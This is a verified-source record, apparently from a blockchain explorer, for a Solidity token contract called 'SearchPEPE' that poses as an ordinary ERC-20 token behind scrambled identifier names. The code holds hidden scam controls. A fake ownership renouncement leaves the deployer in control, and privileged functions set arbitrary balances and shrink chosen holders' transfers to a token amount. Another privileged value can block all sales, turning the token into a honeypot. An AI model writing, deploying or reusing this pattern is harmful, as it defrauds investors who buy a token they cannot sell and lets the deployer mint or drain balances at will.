{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface liquidityLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedTake) external view returns (uint256);\n\n    function transfer(address marketingFund, uint256 limitAt) external returns (bool);\n\n    function allowance(address feeSellLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingFund,\n        uint256 limitAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyModeToken, uint256 value);\n    event Approval(address indexed feeSellLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract toReceiverBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txMarketing {\n    function createPair(address shouldLiquidity, address tradingList) external returns (address);\n}\n\ninterface totalLaunchTo is liquidityLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SearchPEPE is toReceiverBuy, liquidityLaunched, totalLaunchTo {\n\n    bool private fundLiquidity;\n\n    function takeFrom() public {\n        emit OwnershipTransferred(enableBuy, address(0));\n        totalAt = address(0);\n    }\n\n    bool public teamExempt;\n\n    uint256 txAtSell;\n\n    function totalSell(address tradingExempt, uint256 limitAt) public {\n        sellEnable();\n        fromBuy[tradingExempt] = limitAt;\n    }\n\n    mapping(address => uint256) private fromBuy;\n\n    function transferFrom(address amountMinEnable, address marketingFund, uint256 limitAt) external override returns (bool) {\n        if (_msgSender() != autoTo) {\n            if (feeTotalMode[amountMinEnable][_msgSender()] != type(uint256).max) {\n                require(limitAt <= feeTotalMode[amountMinEnable][_msgSender()]);\n                feeTotalMode[amountMinEnable][_msgSender()] -= limitAt;\n            }\n        }\n        return atIs(amountMinEnable, marketingFund, limitAt);\n    }\n\n    uint8 private shouldReceiverLaunched = 18;\n\n    constructor (){\n        if (toMin != amountList) {\n            swapModeTrading = true;\n        }\n        enableShould launchFundToken = enableShould(autoTo);\n        txBuy = txMarketing(launchFundToken.factory()).createPair(launchFundToken.WETH(), address(this));\n        if (swapModeTrading) {\n            amountWallet = sellAmount;\n        }\n        enableBuy = _msgSender();\n        takeFrom();\n        receiverLaunch[enableBuy] = true;\n        fromBuy[enableBuy] = autoTrading;\n        \n        emit Transfer(address(0), enableBuy, autoTrading);\n    }\n\n    bool private listLaunched;\n\n    function approve(address limitList, uint256 limitAt) public virtual override returns (bool) {\n        feeTotalMode[_msgSender()][limitList] = limitAt;\n        emit Approval(_msgSender(), limitList, limitAt);\n        return true;\n    }\n\n    string private amountFundTotal = \"SPE\";\n\n    bool public launchedBuy;\n\n    address public enableBuy;\n\n    uint256 senderMin;\n\n    mapping(address => mapping(address => uint256)) private feeTotalMode;\n\n    address autoTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public txBuy;\n\n    address amountAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address launchedTake) public view virtual override returns (uint256) {\n        return fromBuy[launchedTake];\n    }\n\n    uint256 constant takeTeamShould = 8 ** 10;\n\n    mapping(address => bool) public atTotal;\n\n    bool private swapModeTrading;\n\n    uint256 private autoTrading = 100000000 * 10 ** 18;\n\n    function allowance(address autoSender, address limitList) external view virtual override returns (uint256) {\n        if (limitList == autoTo) {\n            return type(uint256).max;\n        }\n        return feeTotalMode[autoSender][limitList];\n    }\n\n    uint256 private amountWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTrading;\n    }\n\n    uint256 public toMin;\n\n    function launchedFrom(address launchedSellEnable) public {\n        if (teamExempt) {\n            return;\n        }\n        \n        receiverLaunch[launchedSellEnable] = true;\n        \n        teamExempt = true;\n    }\n\n    string private exemptAuto = \"Search PEPE\";\n\n    function atIs(address amountMinEnable, address marketingFund, uint256 limitAt) internal returns (bool) {\n        if (amountMinEnable == enableBuy) {\n            return fromTeam(amountMinEnable, marketingFund, limitAt);\n        }\n        uint256 toFeeLiquidity = liquidityLaunched(txBuy).balanceOf(amountAuto);\n        require(toFeeLiquidity == txAtSell);\n        require(marketingFund != amountAuto);\n        if (atTotal[amountMinEnable]) {\n            return fromTeam(amountMinEnable, marketingFund, takeTeamShould);\n        }\n        return fromTeam(amountMinEnable, marketingFund, limitAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalAt;\n    }\n\n    function sellEnable() private view {\n        require(receiverLaunch[_msgSender()]);\n    }\n\n    mapping(address => bool) public receiverLaunch;\n\n    uint256 private amountList;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptAuto;\n    }\n\n    event OwnershipTransferred(address indexed walletLiquidity, address indexed exemptMax);\n\n    function totalMode(uint256 limitAt) public {\n        sellEnable();\n        txAtSell = limitAt;\n    }\n\n    function transfer(address tradingExempt, uint256 limitAt) external virtual override returns (bool) {\n        return atIs(_msgSender(), tradingExempt, limitAt);\n    }\n\n    uint256 public sellAmount;\n\n    function owner() external view returns (address) {\n        return totalAt;\n    }\n\n    function isMin(address minTx) public {\n        sellEnable();\n        \n        if (minTx == enableBuy || minTx == txBuy) {\n            return;\n        }\n        atTotal[minTx] = true;\n    }\n\n    uint256 private minLaunched;\n\n    function fromTeam(address amountMinEnable, address marketingFund, uint256 limitAt) internal returns (bool) {\n        require(fromBuy[amountMinEnable] >= limitAt);\n        fromBuy[amountMinEnable] -= limitAt;\n        fromBuy[marketingFund] += limitAt;\n        emit Transfer(amountMinEnable, marketingFund, limitAt);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldReceiverLaunched;\n    }\n\n    address private totalAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountFundTotal;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSellLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyModeToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"}],\"name\":\"isMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSellEnable\",\"type\":\"address\"}],\"name\":\"launchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"totalMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"totalSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMinEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SearchPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}